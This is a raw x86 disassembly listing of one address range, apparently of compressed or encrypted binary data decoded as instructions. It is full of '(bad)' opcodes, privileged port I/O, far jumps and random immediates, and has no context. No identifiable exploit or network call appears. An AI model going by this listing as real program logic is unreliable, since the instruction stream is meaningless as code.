  414f6e:	stc    
  414f6f:	les    eax,FWORD PTR [edi-0x49ff3cf0]
  414f75:	inc    eax
  414f76:	leave  
  414f77:	enter  0xa53d,0xd7
  414f7b:	dec    ebx
  414f7c:	or     dh,BYTE PTR [edx-0x4d]
  414f7f:	aam    0x15
  414f81:	fst    QWORD PTR [ecx]
  414f83:	push   esp
  414f84:	inc    ebp
  414f85:	pop    ebp
  414f86:	dec    ebp
  414f87:	mov    edi,DWORD PTR [ebx-0x7d499b39]
  414f8d:	stc    
  414f8e:	lock push 0x5f5919f7
  414f94:	shl    BYTE PTR [edi+0xce5b12f],1
  414f9a:	jmp    DWORD PTR [eax]
  414f9c:	out    0x9,eax
  414f9e:	xor    dh,al
  414fa0:	jge    0x415015
  414fa2:	ins    DWORD PTR es:[edi],dx
  414fa3:	repnz outs dx,BYTE PTR ds:[esi]
  414fa5:	sub    edx,edi
  414fa7:	mov    al,ds:0x1bb8e178
  414fac:	xor    eax,0x8fa663db
  414fb1:	pop    fs
  414fb3:	iret   
  414fb4:	aaa    
  414fb5:	push   ecx
  414fb6:	push   eax
  414fb7:	in     eax,0xd1
  414fb9:	jne    0x414f44
  414fbb:	in     eax,0x9c
  414fbd:	dec    edi
  414fbe:	cmp    ah,BYTE PTR [esi+0x28]
  414fc1:	lea    ebp,[ebp-0x767dcfc6]
  414fc7:	add    eax,0x693fec39
  414fcc:	ss daa 
  414fce:	cdq    
  414fcf:	stos   BYTE PTR es:[edi],al
  414fd0:	dec    ebx
  414fd1:	adc    ebp,ebx
  414fd3:	sub    al,BYTE PTR [ebx+0x21983ce1]
  414fd9:	sahf   
  414fda:	je     0x41504f
  414fdc:	call   0x23aa9af8
  414fe1:	push   esp
  414fe2:	in     eax,0x36
  414fe4:	jg     0x414fea
  414fe6:	mov    edx,0x95b84a47
  414feb:	or     eax,0x2da752a7
  414ff0:	mov    ebp,0x26dc72de
  414ff5:	sti    
  414ff6:	adc    eax,0x351d0bb9
  414ffb:	repnz jecxz 0x41503a
  414ffe:	jge    0x41507f
  415000:	sbb    al,0xc4
  415002:	jne    0x415070
  415004:	imul   ecx,DWORD PTR [ebp-0x5f873d28],0xe5f8401d
  41500e:	adc    ebx,DWORD PTR [eax+0x4d20f893]
  415014:	sub    al,0xbf
  415017:	sbb    BYTE PTR [esi],dl
  415019:	call   0x1ec2:0x258e4530
  415020:	push   esp
  415021:	rcl    DWORD PTR [edi],0x49
  415024:	pop    eax
  415025:	sbb    dl,ch
  415027:	push   edx
  415028:	push   eax
  415029:	and    BYTE PTR [edx*2-0x2476da23],al
  415030:	add    eax,0xb29cdb7
  415035:	xchg   esp,eax
  415036:	and    esi,DWORD PTR [edx]
  415038:	xchg   esp,eax
  415039:	xchg   esi,eax
  41503a:	or     cl,BYTE PTR [ecx+0x18]
  41503d:	xor    eax,0xc59568c1
  415042:	push   edi
  415043:	jbe    0x4150c0
  415045:	add    DWORD PTR [ecx],edi
  415047:	int3   
  415048:	jp     0x4150bb
  41504a:	jp     0x415073
  41504c:	sti    
  41504d:	lahf   
  41504e:	or     eax,0xd0bb6fae
  415053:	adc    esp,DWORD PTR [edi+ebx*1+0x4899a43e]
  41505a:	mov    ch,BYTE PTR [ecx]
  41505c:	cwde   
  41505d:	enter  0x799f,0x99
  415061:	xor    al,0x94
  415063:	(bad)  
  415064:	xlat   BYTE PTR ds:[ebx]
  415065:	test   DWORD PTR [ecx],ecx
  415067:	imul   ebp,DWORD PTR [esp+edx*8+0x5bbce6e9],0x4f8ab698
  415072:	lahf   
  415073:	cmp    al,0x38
  415075:	or     DWORD PTR [eax-0x52],0xffffffb0
  415079:	cld    
  41507a:	sub    ch,BYTE PTR [ebx+edx*1]
  41507d:	push   eax
  41507e:	mov    esi,0xbf071dbb
  415083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415084:	dec    edx
  415085:	loop   0x415073
  415087:	push   es
  415088:	sbb    cl,BYTE PTR [edx]
  41508a:	mov    ch,0x4b
  41508c:	call   0x5983646f
  415091:	out    dx,al
  415092:	shl    BYTE PTR [ecx],0x6d
  415095:	jbe    0x415031
  415097:	shr    DWORD PTR [eax],1
  415099:	adc    DWORD PTR [edx+0x105f9679],ebp
  41509f:	xchg   BYTE PTR [edi-0x5ba3a63d],ch
  4150a5:	data16 fwait
  4150a7:	xchg   ecx,eax
  4150a8:	bound  ecx,QWORD PTR [ebx-0x6b]
  4150ab:	xchg   DWORD PTR [ebx+esi*1+0x74ca1366],eax
  4150b2:	push   edi
  4150b3:	jle    0x32d11b5b
  4150b9:	sar    DWORD PTR [ebp-0xe],0xf3
  4150bd:	and    ch,dh
  4150bf:	int    0xb9
  4150c1:	xor    esi,ecx
  4150c3:	xchg   BYTE PTR [edx-0x7],al
  4150c6:	das    
  4150c7:	ins    BYTE PTR es:[edi],dx
  4150c8:	pop    ebp
  4150c9:	inc    esp
  4150ca:	adc    eax,0x867c797f
  4150cf:	dec    esp
  4150d0:	pop    ds
  4150d1:	imul   ebp,DWORD PTR [eax],0xf0915c87
  4150d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150d8:	sbb    bh,al
  4150da:	hlt    
  4150db:	pop    ecx
  4150dc:	jmp    0xfc4a:0x1a20ab6d
  4150e3:	xor    BYTE PTR ds:0x950d6fc7,bh
  4150e9:	and    dh,dh
  4150eb:	inc    eax
  4150ec:	aaa    
  4150ed:	fisubr WORD PTR [ebp+0x1a]
  4150f0:	ret    0x50e9
  4150f3:	add    eax,0x1c99b5a5
  4150f8:	inc    ecx
  4150f9:	or     esp,ebp
  4150fb:	adc    DWORD PTR [edx+0x2c],esi
  4150fe:	in     al,dx
  4150ff:	jmp    0x4150bf
  415101:	js     0x41511a
  415103:	push   0xffffffda
  415105:	add    cl,BYTE PTR [esi]
  415107:	(bad)  
  415108:	loopne 0x41508b
  41510a:	jge    0x4150b0
  41510c:	fsubr  QWORD PTR [eax]
  41510e:	scas   al,BYTE PTR es:[edi]
  41510f:	push   ds
  415110:	jae    0x4150be
  415112:	fisttp DWORD PTR es:[edx-0x1205d42c]
  415119:	and    dh,BYTE PTR [ecx+0x77d03bfa]
  41511f:	push   0x52c9cca1
  415124:	sub    al,0xb0
  415126:	ret    0x1561
  415129:	cld    
  41512a:	fdiv   QWORD PTR [esi]
  41512c:	sub    ecx,DWORD PTR fs:[ecx+0x30e00272]
  415133:	jle    0x415154
  415135:	xchg   esp,eax
  415136:	jp     0x4150c3
  415138:	cli    
  415139:	sub    al,0xed
  41513b:	das    
  41513c:	cmp    ch,BYTE PTR [edx]
  41513e:	retf   
  41513f:	push   ebp
  415140:	test   BYTE PTR [eax],bl
  415142:	mov    ebp,0x6b1ef39f
  415147:	dec    ecx
  415148:	mov    ds:0xd02d450c,eax
  41514d:	jg     0x41519e
  41514f:	(bad)  
  415150:	enter  0xe5ca,0xf5
  415154:	repnz xchg ebp,eax
  415156:	rcl    ch,1
  415158:	bound  ebp,QWORD PTR [esi]
  41515a:	cli    
  41515b:	bound  esp,QWORD PTR [ebx+ebp*1]
  41515e:	adc    BYTE PTR [esi+eiz*2-0x4d],al
  415162:	sti    
  415163:	and    esp,DWORD PTR [ecx-0x6]
  415166:	retf   
  415167:	mov    eax,ds:0x8ee707c6
  41516c:	pop    esp
  41516d:	jno    0x41515c
  41516f:	mov    al,0x3e
  415171:	jl     0x4150f5
  415173:	bound  esi,QWORD PTR [ebp+0x28]
  415176:	dec    edx
  415177:	mov    es,WORD PTR ds:0x2b760d22
  41517d:	adc    bh,BYTE PTR [ebx-0xbb45675]
  415183:	xor    al,0xfc
  415185:	retf   
  415186:	int3   
  415187:	div    BYTE PTR [ecx]
  415189:	test   ah,ah
  41518b:	shr    BYTE PTR ds:0xb496f88,cl
  415191:	nop
  415192:	fistp  QWORD PTR [edi-0x59]
  415195:	mov    dl,0xc9
  415197:	(bad)  
  415198:	mov    al,ds:0xd226a7ec
  41519d:	lods   eax,DWORD PTR ds:[esi]
  41519e:	cmp    DWORD PTR [eax],edx
  4151a0:	pop    DWORD PTR [ecx+0x55]
  4151a3:	or     eax,0x7c158136
  4151a8:	std    
  4151a9:	sbb    esp,DWORD PTR [ecx+0x66c09960]
  4151af:	or     al,0xb4
  4151b1:	and    eax,0x404419d3
  4151b6:	cmp    BYTE PTR [ebp-0x28e1f486],bh
  4151bc:	add    al,0xb6
  4151be:	mov    bh,0xb1
  4151c0:	xor    al,BYTE PTR [esp+ebp*2+0x53f5105a]
  4151c7:	pop    esi
  4151c8:	push   edx
  4151c9:	fst    QWORD PTR [esi+0x66932560]
  4151cf:	cmc    
  4151d0:	jge    0x41516a
  4151d2:	es ret 
  4151d4:	or     cl,0x0
  4151d7:	jge    0x415173
  4151d9:	mov    bl,0x6e
  4151db:	xlat   BYTE PTR ds:[ebx]
  4151dc:	clc    
  4151dd:	popa   
  4151de:	fucomp st(3)
  4151e0:	mov    ss,WORD PTR [edx-0x16]
  4151e3:	cdq    
  4151e4:	pop    edx
  4151e5:	xor    esp,DWORD PTR [edi]
  4151e7:	fs xchg edx,eax
  4151e9:	retf   0xcb69
  4151ec:	shl    BYTE PTR [edi+0xd4eb050],cl
  4151f2:	in     eax,dx
  4151f3:	and    al,dl
  4151f5:	dec    eax
  4151f6:	inc    eax
  4151f7:	pop    es
  4151f8:	sti    
  4151f9:	stc    
  4151fa:	sbb    ebp,edx
  4151fc:	push   esp
  4151fd:	inc    edi
  4151fe:	popa   
  4151ff:	mov    ah,0x41
  415201:	mov    ebx,0x1d8bedfc
  415206:	test   al,0xf4
  415208:	inc    DWORD PTR [ebp+0x19942b9c]
  41520e:	jno    0x4151e4
  415210:	pop    esi
  415211:	mov    cl,0x54
  415213:	add    eax,0x16ffdff2
  415218:	jle    0x415230
  41521a:	dec    ecx
  41521b:	pushf  
  41521c:	fs dec edx
  41521e:	or     DWORD PTR [edi+ebx*2],0x31c6fa5b
  415225:	xor    DWORD PTR [ebx],ecx
  415227:	(bad)  
  415228:	adc    dh,BYTE PTR [eax+0x6bfbeebf]
  41522e:	inc    edi
  41522f:	cmc    
  415230:	dec    eax
  415231:	jge    0x41521a
  415233:	add    eax,0x7eff8cd0
  415238:	gs sti 
  41523a:	xchg   ch,ch
  41523c:	dec    ecx
  41523d:	xchg   ebp,eax
  41523e:	inc    edx
  41523f:	lods   eax,DWORD PTR ds:[esi]
  415240:	lods   al,BYTE PTR ds:[esi]
  415241:	mov    eax,ds:0xe681b80c
  415246:	cmp    bl,BYTE PTR ds:0x7e613c31
  41524c:	mov    eax,0x61fd3da6
  415251:	call   0x4840:0xfd330772
  415258:	mov    bh,0x16
  41525a:	test   al,0x41
  41525c:	adc    bh,dl
  41525e:	ror    BYTE PTR [eax+0x31],1
  415261:	test   dh,cl
  415263:	retf   
  415264:	xadd   BYTE PTR [esi],bh
  415267:	and    DWORD PTR [ebp-0x12],0xffffff8e
  41526b:	xor    DWORD PTR [ecx-0x67],eax
  41526e:	imul   ecx,DWORD PTR [ebx+0x33],0x2c5dc86a
  415275:	sbb    bl,BYTE PTR [ecx-0x3b3c015b]
  41527b:	ss es pop ds
  41527e:	jno    0x4152fe
  415280:	addr16 gs jmp 0xc70f32bd
  415287:	fisttp QWORD PTR [eax-0x7]
  41528a:	bound  edx,QWORD PTR [ebx]
  41528c:	xchg   BYTE PTR [edx],cl
  41528e:	push   ebx
  41528f:	mov    esp,0xa08a5eb5
  415294:	jae    0x415254
  415296:	mov    edx,0xf9f3bc14
  41529b:	lods   al,BYTE PTR ds:[esi]
  41529c:	in     eax,dx
  41529d:	fild   DWORD PTR [esp+ecx*2+0x35244c75]
  4152a4:	stos   DWORD PTR es:[edi],eax
  4152a5:	and    ebx,DWORD PTR [ecx]
  4152a7:	ds inc esp
  4152a9:	mov    ds:0x326b00b3,eax
  4152ae:	mov    DWORD PTR ds:0x57c15b5,ecx
  4152b4:	inc    eax
  4152b5:	imul   ecx,ecx,0xffffffa3
  4152b8:	sbb    ah,al
  4152ba:	in     eax,dx
  4152bb:	rcr    BYTE PTR [esi],1
  4152bd:	outs   dx,BYTE PTR ds:[esi]
  4152be:	jno    0x4152f5
  4152c0:	xlat   BYTE PTR ds:[ebx]
  4152c2:	push   eax
  4152c3:	jecxz  0x41527a
  4152c5:	xchg   edx,eax
  4152c6:	push   eax
  4152c7:	dec    edx
  4152c8:	dec    edi
  4152c9:	push   cs
  4152ca:	bound  edx,QWORD PTR [ebp+0x63]
  4152cd:	xchg   edx,eax
  4152ce:	jmp    0xe43f:0x5523bbdb
  4152d5:	xor    ah,BYTE PTR [edx+eiz*2]
  4152d8:	inc    esi
  4152d9:	aaa    
  4152da:	jp     0x415263
  4152dc:	mov    ch,0xe
  4152de:	loopne 0x41529b
  4152e0:	out    0x4c,al
  4152e2:	ins    BYTE PTR es:[edi],dx
  4152e3:	jmp    0xe59c:0x6b69d46d
  4152ea:	cmp    ebx,DWORD PTR [ebx+0x50]
  4152ed:	push   ss
  4152ee:	sbb    eax,DWORD PTR [esi+edi*4+0x45]
  4152f2:	cmp    DWORD PTR [edx+0x49],ebp
  4152f5:	mov    eax,0x4041d877
  4152fa:	pop    ebx
  4152fb:	ss ins DWORD PTR es:[edi],dx
  4152fd:	mov    bh,0x5a
  4152ff:	inc    edi
  415300:	mov    esp,0x69221c6c
  415305:	inc    edx
  415306:	fld    TBYTE PTR [esi+0x141a4cd]
  41530c:	test   al,0xae
  41530e:	ds out 0xa,eax
  415311:	inc    ecx
  415312:	lods   al,BYTE PTR ds:[esi]
  415313:	push   ecx
  415314:	stc    
  415315:	jecxz  0x41535c
  415317:	jo     0x415381
  415319:	inc    esp
  41531a:	push   ebp
  41531b:	pop    ds
  41531c:	rol    DWORD PTR [edi],cl
  41531e:	rcr    DWORD PTR [ebp+0x44b97110],1
  415324:	jge    0x4152f7
  415326:	and    BYTE PTR cs:[edx+0x251d4954],ah
  41532d:	cmp    BYTE PTR ds:0x4d553f9f,ah
  415333:	adc    ecx,esi
  415335:	hlt    
  415336:	or     BYTE PTR [esi],ch
  415338:	mov    al,ds:0xa7004354
  41533d:	cs xchg ebp,eax
  41533f:	jb     0x4152fe
  415341:	ret    
  415342:	xchg   ecx,eax
  415343:	stc    
  415344:	jb     0x41535c
  415346:	xchg   edi,eax
  415347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415348:	(bad)  
  415349:	hlt    
  41534a:	outs   dx,BYTE PTR ds:[esi]
  41534b:	push   0x8fbc717d
  415350:	sub    ecx,DWORD PTR [edi]
  415352:	or     eax,0xa94e3457
  415357:	test   BYTE PTR [ecx+0x5d3b0fab],dh
  41535d:	pop    eax
  41535e:	pop    eax
  41535f:	cmp    esp,DWORD PTR [esi+0x14]
  415362:	sti    
  415363:	mov    ecx,0xf8b7863c
  415368:	xor    al,dh
  41536a:	jmp    0x41534f
  41536c:	adc    al,0x9f
  41536e:	lods   al,BYTE PTR ds:[esi]
  41536f:	xchg   ebp,eax
  415370:	rcr    bh,1
  415372:	add    BYTE PTR [eax-0xf1f9d57],ah
  415378:	or     eax,DWORD PTR [ebp+ebp*4+0x53a1b02c]
  41537f:	xchg   edi,eax
  415380:	mov    ebp,DWORD PTR [ecx]
  415382:	hlt    
  415383:	out    dx,al
  415384:	fsubr  QWORD PTR [edx+0x78]
  415387:	jp     0x41537c
  415389:	test   al,0x7a
  41538b:	xchg   ah,bh
  41538d:	retf   
  41538e:	sbb    al,al
  415390:	jno    0x4153f4
  415392:	popa   
  415393:	mov    ch,0xf6
  415395:	jae    0x4153f7
  415397:	imul   esp,DWORD PTR [esi+0x55ca9204],0x69
  41539e:	sbb    DWORD PTR [esi-0x5d],ecx
  4153a1:	es xchg ebp,edx
  4153a4:	mov    es,edi
  4153a6:	mov    edx,0x475efce5
  4153ab:	mov    esi,0xda337094
  4153b0:	mov    ebp,0x7f3722bb
  4153b5:	xlat   BYTE PTR ds:[ebx]
  4153b6:	pop    es
  4153b7:	(bad)  
  4153b8:	push   cs
  4153b9:	xor    BYTE PTR [edi],0x54
  4153bc:	sbb    al,0x84
  4153be:	ret    
  4153bf:	or     esp,DWORD PTR [esi]
  4153c1:	or     eax,0xbf116009
  4153c6:	fwait
  4153c7:	test   BYTE PTR [ecx+0x78],dl
  4153ca:	gs mov ebx,0xd7a27888
  4153d0:	cld    
  4153d1:	adc    dh,BYTE PTR [edi+0x32]
  4153d4:	dec    eax
  4153d5:	rol    DWORD PTR [eax-0x19b150e8],0x67
  4153dc:	call   0x5ab826da
  4153e1:	call   0x2b0e16f0
  4153e6:	inc    esi
  4153e7:	das    
  4153e8:	inc    ecx
  4153e9:	push   es
  4153ea:	add    BYTE PTR [ecx-0x79ab225f],bh
  4153f0:	mov    ds:0xf82527f6,al
  4153f5:	xlat   BYTE PTR ds:[ebx]
  4153f6:	je     0x41542c
  4153f8:	jl     0x41542f
  4153fa:	xchg   ecx,eax
  4153fb:	inc    ebp
  4153fc:	mov    BYTE PTR [esi-0x7d],cl
  4153ff:	into   
  415400:	imul   esi,DWORD PTR [esi+0x36],0x33aff61b
  415407:	mov    al,0x3e
  415409:	push   eax
  41540a:	or     eax,0xf3d0b1aa
  41540f:	leave  
  415410:	and    DWORD PTR [esp+edi*4],edi
  415413:	xor    BYTE PTR [ebx+0x5e],bh
  415416:	push   eax
  415417:	or     ah,cl
  415419:	xchg   DWORD PTR [ecx+0x8],edi
  41541c:	mov    WORD PTR es:[eax+0x1d],es
  415420:	mov    esi,0x8df1ccd8
  415425:	inc    edi
  415426:	lods   eax,DWORD PTR ds:[esi]
  415427:	mov    esi,0x2086d3d
  41542c:	scas   al,BYTE PTR es:[edi]
  41542d:	js     0x4153fb
  41542f:	jmp    0x23f6:0x2fd780e1
  415436:	ins    BYTE PTR es:[edi],dx
  415437:	mov    cs,WORD PTR [ebx+edx*2-0x39218a19]
  41543e:	(bad)  [ebx-0xd]
  415441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415442:	leave  
  415443:	mov    dl,BYTE PTR [ebp+0x4ea16b72]
  415449:	fcomp  QWORD PTR ds:0xfe52350b
  41544f:	mov    cs,WORD PTR [ebx+0x76a41d64]
  415455:	xchg   esp,eax
  415456:	xor    eax,DWORD PTR [esi]
  415458:	push   eax
  415459:	jbe    0x415473
  41545b:	cmp    edx,DWORD PTR [edi]
  41545d:	and    ch,BYTE PTR [eax+0x3fc8b496]
  415463:	inc    eax
  415464:	gs mov ah,0x92
  415467:	in     eax,0xd9
  415469:	imul   edi,edx,0x60cc153e
  41546f:	repnz inc esp
  415471:	jmp    0x4154db
  415473:	mov    ch,BYTE PTR fs:[edx]
  415476:	icebp  
  415477:	mov    ds:0xd59b9ec5,al
  41547c:	pop    edi
  41547d:	mov    WORD PTR [edx+ecx*8+0x1aca3122],es
  415484:	pop    edx
  415485:	xchg   DWORD PTR [eax-0x2],ecx
  415488:	xor    al,0x56
  41548a:	mov    esp,0x370cc5
  41548f:	pop    edx
  415490:	ret    0x2318
  415493:	out    0x8e,al
  415495:	call   0x3c:0x1426c225
  41549c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41549d:	jno    0x4154d3
  41549f:	js     0x4154da
  4154a1:	imul   eax,DWORD PTR [eax+0x379cca5],0x3
  4154a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154a9:	inc    ecx
  4154aa:	setnp  ah
  4154ad:	mov    eax,0x87053008
  4154b2:	xchg   ebp,eax
  4154b3:	push   edi
  4154b4:	jp     0x415520
  4154b6:	cmc    
  4154b7:	hlt    
  4154b8:	cmp    edi,DWORD PTR [eax]
  4154ba:	cld    
  4154bb:	jns    0x415498
  4154bd:	or     DWORD PTR [ebx+eax*1],esp
  4154c0:	push   edx
  4154c1:	push   ecx
  4154c2:	fild   QWORD PTR [edi+0x7aa07124]
  4154c8:	rcl    BYTE PTR [eax+esi*1-0x76dcf654],1
  4154cf:	xchg   edx,eax
  4154d0:	mov    ebp,gs
  4154d2:	adc    eax,0x1f6b8b6e
  4154d7:	test   BYTE PTR [edi+ebx*8+0x3ff5ce0f],dh
  4154de:	fcom   DWORD PTR [esi-0x59]
  4154e1:	ret    0x5213
  4154e4:	sub    eax,0x3804cf9b
  4154e9:	dec    eax
  4154ea:	imul   ebx,DWORD PTR [edi+esi*8+0x49856886],0x44
  4154f2:	push   edi
  4154f3:	or     ah,BYTE PTR [ebx-0x543b3e3a]
  4154f9:	mov    esi,0x19940d9
  4154fe:	add    edx,ebp
  415500:	push   eax
  415501:	dec    ecx
  415502:	sub    al,0x7f
  415504:	ds adc cl,ch
  415507:	sub    dl,BYTE PTR [eax*1-0x19ae5705]
  41550e:	jnp    0x4154a7
  415510:	cmp    ah,BYTE PTR [edi-0x1c98f952]
  415516:	pop    ecx
  415517:	jge    0x4154a3
  415519:	fs inc edi
  41551b:	dec    esi
  41551c:	mov    cl,0xca
  41551e:	cli    
  41551f:	hlt    
  415520:	fimul  DWORD PTR [ecx-0x21]
  415523:	mov    dl,0xd7
  415525:	fmul   DWORD PTR [edi+0x2d]
  415528:	mov    dl,0x17
  41552a:	pop    es
  41552b:	aaa    
  41552c:	lods   eax,DWORD PTR ds:[esi]
  41552d:	loope  0x41558a
  41552f:	xor    al,0x19
  415531:	in     al,0xc1
  415533:	leave  
  415534:	jb     0x4155a3
  415536:	arpl   WORD PTR [edi-0x27],bx
  415539:	adc    bh,al
  41553b:	dec    edx
  41553c:	test   BYTE PTR [eax+0x1f729d65],dh
  415542:	sub    al,0xf1
  415544:	pop    ebx
  415545:	xchg   esi,eax
  415546:	inc    ebx
  415547:	cmp    al,0xb0
  415549:	jp     0x415527
  41554b:	fst    st(4)
  41554d:	xchg   esi,esi
  41554f:	mov    ebp,0x7378c98b
  415554:	cli    
  415555:	sub    dh,al
  415557:	mov    eax,0x985a5c22
  41555c:	sub    DWORD PTR [esi+0x18],esp
  41555f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415560:	stos   DWORD PTR es:[edi],eax
  415561:	push   esi
  415562:	data16 sbb dh,BYTE PTR [ebp+0x4abcbf83]
  415569:	adc    DWORD PTR gs:0x61443669,eax
  415570:	je     0x4154fd
  415572:	test   al,0x5f
  415574:	jb     0x415520
  415576:	imul   ebx,DWORD PTR [edx],0xa
  415579:	cmp    esi,eax
  41557b:	inc    edx
  41557c:	neg    DWORD PTR [eax+0x3a]
  41557f:	test   al,0x85
  415581:	test   DWORD PTR [edx+0x5e],ecx
  415584:	mov    bl,0x95
  415586:	mov    ebp,DWORD PTR [ebp+0x6f]
  415589:	sub    BYTE PTR [eax-0x47],ch
  41558c:	loopne 0x41555d
  41558e:	and    al,0x43
  415590:	sar    edx,0x54
  415593:	pop    edi
  415594:	or     cl,BYTE PTR [ecx]
  415596:	sbb    eax,0xecf6e851
  41559b:	dec    esp
  41559c:	fild   DWORD PTR [esi+edx*1]
  41559f:	inc    edx
  4155a0:	jbe    0x4155d4
  4155a2:	aas    
  4155a3:	push   ecx
  4155a4:	(bad)  
  4155a5:	mov    bh,0x25
  4155a7:	mov    edx,0xe7a4a58b
  4155ac:	out    0xb8,al
  4155ae:	ret    0x1576
  4155b1:	xlat   BYTE PTR ds:[ebx]
  4155b2:	les    esp,FWORD PTR [edi]
  4155b4:	cmpxchg BYTE PTR [eax+0x33],al
  4155b8:	inc    ebx
  4155b9:	inc    eax
  4155ba:	fs shr ebp,0xac
  4155be:	sbb    DWORD PTR ds:0x39a2255b,ebx
  4155c4:	popa   
  4155c5:	ins    BYTE PTR es:[edi],dx
  4155c6:	and    dh,BYTE PTR [ebp+ecx*1-0x6]
  4155ca:	mov    esi,0xf042eaaa
  4155cf:	pop    esi
  4155d0:	xchg   esp,eax
  4155d1:	(bad)  [edx]
  4155d3:	ds (bad) 
  4155d5:	fisubr DWORD PTR [edx+esi*1+0x440f7c28]
  4155dc:	mov    esi,0x31327ba
  4155e1:	shr    DWORD PTR [edi-0x60],cl
  4155e4:	popa   
  4155e5:	add    eax,0x36a6c947
  4155ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155eb:	test   eax,0x857b3df4
  4155f0:	xlat   BYTE PTR ds:[ebx]
  4155f1:	imul   edi,eax,0x0
  4155f4:	(bad)  
  4155f5:	imul   edx,DWORD PTR [esi+0x677edf0],0xffffffc1
  4155fc:	mov    esi,0xd7c4a651
  415601:	mov    esi,ebp
  415603:	or     esp,DWORD PTR [ecx-0x702cc35c]
  415609:	jb     0x415592
  41560b:	xor    bh,BYTE PTR [edx-0x24]
  41560e:	fwait
  41560f:	es or  al,0xcc
  415612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415613:	jae    0x415679
  415615:	inc    ebx
  415616:	arpl   WORD PTR [edx+eax*4],sp
  415619:	inc    ebx
  41561a:	pop    ecx
  41561b:	loop   0x415671
  41561d:	push   ebx
  41561e:	sar    BYTE PTR [edi-0x6e199124],cl
  415624:	jmp    0xa831:0xc1ce4400
  41562b:	shl    DWORD PTR [ebx+0x1a5251da],0x48
  415632:	(bad)  [esi+edx*1]
  415635:	xchg   ebp,eax
  415636:	repnz inc BYTE PTR [edx]
  415639:	xor    al,BYTE PTR [ecx-0x56]
  41563c:	mov    ecx,0x764b6e1f
  415641:	adc    ebx,DWORD PTR [ecx+0x6]
  415644:	dec    edi
  415645:	xchg   ebp,eax
  415646:	inc    esi
  415647:	bound  edi,QWORD PTR [edx+0x2]
  41564a:	sbb    ebx,esi
  41564c:	mov    dh,0x4
  41564e:	adc    BYTE PTR [di],cl
  415651:	or     DWORD PTR [ecx+0x1f],esi
  415654:	js     0x415694
  415656:	sbb    ah,ch
  415658:	sub    eax,0x87e76ebf
  41565d:	sahf   
  41565e:	adc    BYTE PTR [ebp+0x3e89b40c],ah
  415664:	mov    ebx,0xfbb9e998
  415669:	mov    al,0xad
  41566b:	leave  
  41566c:	pushf  
  41566d:	lea    ecx,[ebx-0x624dc09f]
  415673:	jno    0x4156d7
  415675:	stc    
  415676:	sbb    ah,BYTE PTR [ebp+edx*4-0x9]
  41567a:	or     DWORD PTR [edx+0xd558bdf],ebp
  415680:	out    dx,al
  415681:	shr    DWORD PTR [eax-0x78406cf4],cl
  415687:	js     0x4156aa
  415689:	mov    esp,0x614a79df
  41568e:	lock jge 0x415668
  415691:	add    eax,0xf9b79809
  415696:	rcr    DWORD PTR [edx-0x5ba6901e],0x45
  41569d:	or     eax,ebx
  41569f:	test   DWORD PTR [edx+0x69882df8],ebx
  4156a5:	or     al,0xbb
  4156a7:	out    0xa4,al
  4156a9:	jmp    ebp
  4156ab:	(bad)  
  4156ac:	jmp    0xe752ad1a
  4156b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b2:	test   al,0xb9
  4156b4:	addr16 stc 
  4156b6:	cmc    
  4156b7:	fisub  DWORD PTR [ecx-0x4e41acc5]
  4156bd:	enter  0xd00f,0x88
  4156c1:	enter  0xa9ef,0x7d
  4156c5:	inc    esi
  4156c6:	sbb    al,0x57
  4156c8:	and    bh,bh
  4156ca:	inc    ecx
  4156cb:	lock mov dh,0x6f
  4156ce:	mov    ebp,0xf9a1efec
  4156d3:	push   es
  4156d4:	mov    bh,0x3f
  4156d6:	jno    0x41568d
  4156d8:	fdivrp st(2),st
  4156da:	icebp  
  4156db:	dec    esi
  4156dc:	xor    BYTE PTR [edx+edi*8+0x25df43af],al
  4156e3:	push   0xb32af624
  4156e8:	adc    al,0x82
  4156ea:	sub    al,0xf1
  4156ec:	or     BYTE PTR [ecx],bh
  4156ee:	stc    
  4156ef:	test   al,0xac
  4156f1:	ret    
  4156f2:	add    eax,0x8f47a43c
  4156f7:	je     0x4156d5
  4156f9:	jns    0x4156d8
  4156fb:	adc    BYTE PTR ds:0x82c5bef7,cl
  415701:	mov    es:0x13e2aa51,eax
  415707:	mov    BYTE PTR [ebp+0x1445e98e],bl
  41570d:	retf   
  41570e:	xchg   ebp,eax
  41570f:	push   esp
  415710:	ins    BYTE PTR es:[edi],dx
  415711:	jne    0x41575c
  415713:	xchg   esp,eax
  415714:	mov    ch,0xae
  415716:	adc    bl,bh
  415718:	jno    0x4156f8
  41571a:	ret    0x4576
  41571d:	xchg   esi,eax
  41571e:	sub    edi,DWORD PTR [esi-0x14737496]
  415724:	call   FWORD PTR [edi+0x5bbf408d]
  41572a:	mov    dh,0xa3
  41572c:	cwde   
  41572d:	adc    al,0x5a
  41572f:	sbb    BYTE PTR [ebx],dl
  415731:	and    DWORD PTR [edx],ecx
  415733:	repnz mov ch,dl
  415736:	shl    DWORD PTR [edx-0x5e6c46a0],0x87
  41573d:	in     al,0x98
  41573f:	shr    BYTE PTR ds:0xe8f59bed,cl
  415745:	stc    
  415746:	push   0xfffffff6
  415748:	inc    ebx
  415749:	push   ebx
  41574a:	xchg   edi,eax
  41574b:	jl     0x415704
  41574d:	add    BYTE PTR [esi-0x7b444985],dl
  415753:	rcl    BYTE PTR [ecx],cl
  415755:	jo     0x415725
  415757:	out    0x99,al
  415759:	inc    DWORD PTR [edx+0x64]
  41575c:	sub    eax,0x865e9683
  415761:	stos   BYTE PTR es:[edi],al
  415762:	xor    ch,BYTE PTR [esi+eiz*8-0x29286689]
  415769:	push   ecx
  41576a:	sbb    al,0x33
  41576c:	mov    al,ds:0x9035380c
  415771:	(bad)  [ebx+0x2b3d104b]
  415777:	nop
  415778:	in     eax,dx
  415779:	ret    0x5ee9
  41577c:	cmc    
  41577d:	rcl    DWORD PTR [esi+ebp*2-0x30],0x10
  415782:	(bad)  [edi+ecx*2+0x3632c4db]
  415789:	rol    ebx,1
  41578b:	jns    0x415741
  41578d:	outs   dx,BYTE PTR ds:[esi]
  41578e:	adc    ebx,DWORD PTR [eax]
